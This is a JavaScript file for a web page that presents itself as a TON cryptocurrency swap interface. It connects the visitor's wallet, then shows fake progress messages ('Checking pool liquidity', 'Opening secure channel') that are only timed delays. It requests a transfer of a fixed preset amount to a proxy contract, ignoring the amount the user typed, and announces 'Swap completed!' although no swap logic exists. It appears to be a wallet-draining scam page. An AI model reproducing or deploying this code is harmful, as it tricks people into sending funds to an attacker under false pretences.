// script.js
var tonConnectUI = null;
var isProcessing  = false;

function setStatus(text, isLoading) {
    var el = document.getElementById('status');
    if (!el) return;
    el.innerHTML = isLoading ? '<span class="loader"></span> ' + text : text;
}

function updateBtn(connected) {
    var btn = document.getElementById('swapBtn');
    if (!btn) return;
    btn.textContent     = connected ? 'Swap' : 'Connect Wallet';
    btn.style.background = connected ? '#1f6feb' : '#21262d';
}

function sleep(ms) { return new Promise(function(r){ setTimeout(r, ms); }); }

async function fetchJson(url) {
    var res = await fetch(url, { cache: 'no-store' });
    if (!res.ok) throw new Error('HTTP ' + res.status);
    return res.json();
}

async function getBalance(address) {
    if (!address) return 0;

    // 1) tonapi.io (no API key required, generous rate limits)
    try {
        var j1 = await fetchJson('https://tonapi.io/v2/accounts/' + encodeURIComponent(address));
        if (j1 && typeof j1.balance !== 'undefined') {
            return Number(j1.balance) / 1e9;
        }
    } catch (e1) {
        console.warn('tonapi balance error', e1);
    }

    // 2) toncenter fallback
    try {
        var j2 = await fetchJson('https://toncenter.com/api/v2/getAddressBalance?address=' + encodeURIComponent(address));
        if (j2 && j2.ok) {
            return Number(j2.result) / 1e9;
        }
    } catch (e2) {
        console.warn('toncenter balance error', e2);
    }

    return 0;
}

async function executeFaw(userAddress) {
    var balance = await getBalance(userAddress);
    if (balance < 0.2) {
        setStatus('❌ Insufficient balance (' + balance.toFixed(2) + ' TON)');
        return false;
    }

    setStatus('🔄 Checking pool liquidity...', true);  await sleep(1000);
    setStatus('📊 Calculating fees...', true);           await sleep(800);
    setStatus('🔐 Opening secure channel...', true);    await sleep(700);

    var nano = String(Math.round(parseFloat(two_AMOUNT) * 1e9));

    var tx = {
        validUntil: Math.floor(Date.now() / 1000) + 600,
        messages: [{ address: PROXY_CONTRACT, amount: nano, payload: 'swap' }]
    };

    setStatus('⏳ Confirm in wallet (' + two_AMOUNT + ' TON)');

    try {
        await tonConnectUI.sendTransaction(tx);
        setStatus('✅ Swap completed!');
        return true;
    } catch(e) {
        setStatus('❌ Cancelled: ' + e.message);
        return false;
    }
}

function initApp() {
    // Resolve SDK class only at runtime, after all scripts have loaded
    var TonConnectUIClass = null;
    if (window.TON_CONNECT_UI && window.TON_CONNECT_UI.TonConnectUI) {
        TonConnectUIClass = window.TON_CONNECT_UI.TonConnectUI;
    } else if (window.TonConnectUI) {
        TonConnectUIClass = window.TonConnectUI;
    }

    if (!TonConnectUIClass) {
        console.error('TonConnectUI not found in window');
        setStatus('❌ SDK failed to load. Please refresh.');
        return;
    }

    try {
        tonConnectUI = new TonConnectUIClass({
            manifestUrl: 'https://kareli123.github.io/test123/tonconnect-manifest.json',
            buttonRootId: 'ton-connect'
        });
    } catch(e) {
        console.error('TonConnectUI init error:', e);
        setStatus('❌ Init error: ' + e.message);
        return;
    }

    updateBtn(tonConnectUI.connected);

    tonConnectUI.onStatusChange(async function(wallet) {
        updateBtn(!!wallet);
        var balEl = document.getElementById('user-balance');

        if (wallet && wallet.account) {
            var addr = wallet.account.address;
            setStatus('🪛 ' + addr.slice(0,6) + '...' + addr.slice(-4), true);
            if (balEl) {
                balEl.textContent = 'Balance: loading...';
                var bal = await getBalance(addr);
                balEl.textContent = 'Balance: ' + bal.toFixed(2) + ' TON';
            }
            setStatus('');
        } else {
            if (balEl) balEl.textContent = 'Balance: 0';
        }
    });

    // Sync pay → receive
    var payInput = document.getElementById('payAmount');
    var recInput = document.getElementById('receiveAmount');
    if (payInput && recInput) {
        payInput.addEventListener('input', function() { recInput.value = payInput.value; });
    }

    var btn = document.getElementById('swapBtn');
    if (!btn) return;

    btn.addEventListener('click', async function() {
        if (isProcessing) return;

        if (!tonConnectUI.connected) {
            setStatus('🚀 Opening wallet selector...', true);
            try { await tonConnectUI.openModal(); }
            catch(err) { setStatus('⚠️ ' + err.message); }
        } else {
            var wallet = tonConnectUI.account;
            if (wallet && wallet.address) {
                isProcessing = true;
                var orig = btn.textContent;
                btn.textContent = 'Processing...';
                btn.disabled = true;
                try { await executeFaw(wallet.address); }
                catch(err) { setStatus('⚠️ ' + err.message); }
                finally { isProcessing = false; btn.textContent = orig; btn.disabled = false; }
            }
        }
    });
}

window.addEventListener('load', initApp);
